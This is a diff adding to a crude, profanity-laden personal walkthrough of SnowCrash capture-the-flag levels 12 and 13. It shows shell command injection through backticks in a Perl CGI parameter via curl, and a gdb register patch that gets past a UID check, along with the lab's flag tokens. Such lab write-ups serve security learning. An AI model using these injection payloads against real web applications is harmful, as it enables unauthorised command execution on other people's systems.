@@ -555,7 +555,7 @@ Erf nope..
 ```
 *of course it's a stupid idea*
 
-script hashed input and does useless shit to it and no matter the input, will display either **"Erf nope..\n"** or **"Gz you dumb*\n"**, so what's the point in being alive
+script hashed input and does useless shit to it and no matter the input, will display either **"Erf nope..\n"** or **"Gz you dumb\n"**, so what's the point in being alive
 ```
 prog = io.popen("echo "..pass.." | sha1sum", "r")
 ```
@@ -571,3 +571,160 @@ Password:fa6v5ateaw21peobuub8ipe6s
 ```
 *oups, fucking retard*
 ## level12, fucking perl again?????
+And **CGI** again
+```
+@output = `egrep "^$xx" /tmp/xd 2>&1`;
+```
+*this is the only thing that looks suspicious or exploitable, rest looks useless*
+
+script takes **n(t(param("x"), param("y")));** first param x and **$xx =~ tr/a-z/A-Z/;** uppercases the shit out of it, then **$xx =~ s/\s.\*//;** fucking substitutes /*/ or I dont even know what the fuck that is
+**Oh fuck I googles, apparently apter capitalizing the argument, it deletes whats after a space, Im a fucking joke**
+### Im so fucking lost
+so I need to create a script with an uppercase name cuz fucking stupid fucking Linux
+```
+level12@SnowCrash:~$ touch /tmp/A
+level12@SnowCrash:~$ echo "getflag > /tmp/a" > /tmp/A
+```
+then
+```
+➜  snowcrash git:(master) ✗ curl '10.11.100.157:4646?x=`/*/A`'
+..%                                                                                                                                      
+➜  snowcrash git:(master) ✗ curl '10.11.100.157:4646?x=`"/*/A`"'
+.%
+```
+and
+```
+level12@SnowCrash:~$ cat /tmp/a
+cat: /tmp/a: No such file or directory
+```
+*fucking kill meeeee*
+
+So **($f, $s) = split(/:/, $line);** this shit splits the file name, also the fuck only prints **..** or **.**, are there logs for this stupid shit, kill me
+```
+evel12@SnowCrash:~$ find / -user flag12 2>/dev/null
+/var/www/level12
+/var/www/level12/level12.pl
+/rofs/var/www/level12
+/rofs/var/www/level12/level12.pl
+```
+I guess this is apache2, googles log files for apache2, **/var/log/apache/access.log**
+```
+level12@SnowCrash:~$ ls  /var/log/apache/access.log
+ls: cannot access /var/log/apache/access.log: No such file or directory
+level12@SnowCrash:~$ ls  /var/log
+apache2  apt  auth.log  boot.log  casper.log  dmesg  dmesg.0  kern.log  mail.err  mail.log  news  syslog  udev  ufw.log
+level12@SnowCrash:~$ ls  /var/log/apache2/
+access.log  error.log  other_vhosts_access.log  suexec.log
+level12@SnowCrash:~$ cat /var/log/apache2/error.log
+[Thu Nov 26 10:05:56 2020] [notice] suEXEC mechanism enabled (wrapper: /usr/lib/apache2/suexec)
+[Thu Nov 26 10:05:56 2020] [notice] Apache/2.2.22 (Ubuntu) PHP/5.3.10-1ubuntu3.19 with Suhosin-Patch configured -- resuming normal operations
+[Thu Nov 26 11:50:05 2020] [error] [client 10.11.4.10] sh: 1: 
+[Thu Nov 26 11:50:05 2020] [error] [client 10.11.4.10] /tmp/A: Permission denied
+[Thu Nov 26 11:50:05 2020] [error] [client 10.11.4.10] 
+[Thu Nov 26 11:50:25 2020] [error] [client 10.11.4.10] sh: 1: 
+[Thu Nov 26 11:50:25 2020] [error] [client 10.11.4.10] Syntax error: Unterminated quoted string
+[Thu Nov 26 11:50:25 2020] [error] [client 10.11.4.10] 
+[Thu Nov 26 11:54:39 2020] [error] [client 10.11.4.10] sh: 1: 
+[Thu Nov 26 11:54:39 2020] [error] [client 10.11.4.10] /tmp/A: Permission denied
+[Thu Nov 26 11:54:39 2020] [error] [client 10.11.4.10] 
+[Thu Nov 26 11:54:51 2020] [error] [client 10.11.4.10] sh: 1: 
+[Thu Nov 26 11:54:51 2020] [error] [client 10.11.4.10] /tmp/A: Permission denied
+[Thu Nov 26 11:54:51 2020] [error] [client 10.11.4.10]
+```
+*so it's apache2, my bad*
+
+/tmp/A: Permission denied, fucking kill me, whyyyyy.
+
+### tried AGAIN
+```
+level12@SnowCrash:/tmp$ touch G
+level12@SnowCrash:/tmp$ echo '/bin/getflag > /tmp/g' > G
+level12@SnowCrash:/tmp$ touch /tmp/g
+
+➜  snowcrash git:(master) ✗ curl '10.11.100.157:4646?x=`/*/G`'
+..%
+
+level12@SnowCrash:/tmp$ cat /tmp/g
+level12@SnowCrash:/tmp$ rm *cat /var/log/apache2/error.log
+.
+.
+[Thu Nov 26 12:15:27 2020] [error] [client 10.11.4.10] /tmp/G: Permission denied
+```
+**NOOOOOO**
+
+Oh shit,  does it need the x permission to execute it, omg am I this retarded
+```
+level12@SnowCrash:/tmp$ chmod +x G
+
+➜  snowcrash git:(master) ✗ curl '10.11.100.157:4646?x=`/*/G`'
+..% 
+
+level12@SnowCrash:/tmp$ cat /tmp/g
+Check flag.Here is your token : g1qKMiRpXf53AWhDaU7FEkczr
+level12@SnowCrash:/tmp$ su level13
+Password:g1qKMiRpXf53AWhDaU7FEkczr
+```
+*okay I am that fucking retarded*
+## level13
+```
+level13@SnowCrash:~$ ls -l level13 
+-rwsr-sr-x 1 flag13 level13 7303 Aug 30  2015 level13
+level13@SnowCrash:~$ ./level13 
+UID 2013 started us but we we expect 4242
+```
+*kill me whyyyyyyy am I always below expectations*
+```
+➜  snowcrash git:(master) ✗ scp -P 4242 level13@10.11.100.157:/home/user/level13/level13 .
+```
+**binary ninja**, calls getuid then compares it with **0x1092 which is 4242**, then blah blah dc
+```
+call    getuid
+cmp     eax, 0x1092 
+```
+### where the fuck does getuid() get the UID
+```
+level13@SnowCrash:~$ echo $UID
+2013
+level13@SnowCrash:~$ ./level13 
+UID 2013 started us but we we expect 4242
+level13@SnowCrash:~$ UID=4242
+bash: UID: readonly variable
+```
+*oh why do i always think I'm so fucking smart*
+
+**fucking gdb will fucking help**
+
+```
+level13@SnowCrash:~$ gdb ./level13
+(gdb) b main
+Breakpoint 1 at 0x804858f
+(gdb) b getuid
+Breakpoint 2 at 0x8048380
+(gdb) r
+Starting program: /home/user/level13/level13 
+
+Breakpoint 1, 0x0804858f in main ()
+(gdb) c
+Continuing.
+
+Breakpoint 2, 0xb7ee4cc0 in getuid () from /lib/i386-linux-gnu/libc.so.6
+```
+After disassembling main, **0x0804859a** is the address in which the cmp occurs, so I wil set EAX to **0x1092** tada
+```
+(gdb) s
+Single stepping until exit from function getuid,
+which has no line number information.
+0x0804859a in main ()
+(gdb) set $eax=0x1092
+(gdb) s
+Single stepping until exit from function main,
+which has no line number information.
+your token is 2A31L79asukciNyi8uppkEuSx
+```
+*TADA, bitch*
+```
+level13@SnowCrash:~$ su level14
+Password:2A31L79asukciNyi8uppkEuSx
+```
+## level14
+NO fucking files for fuck's sake, again
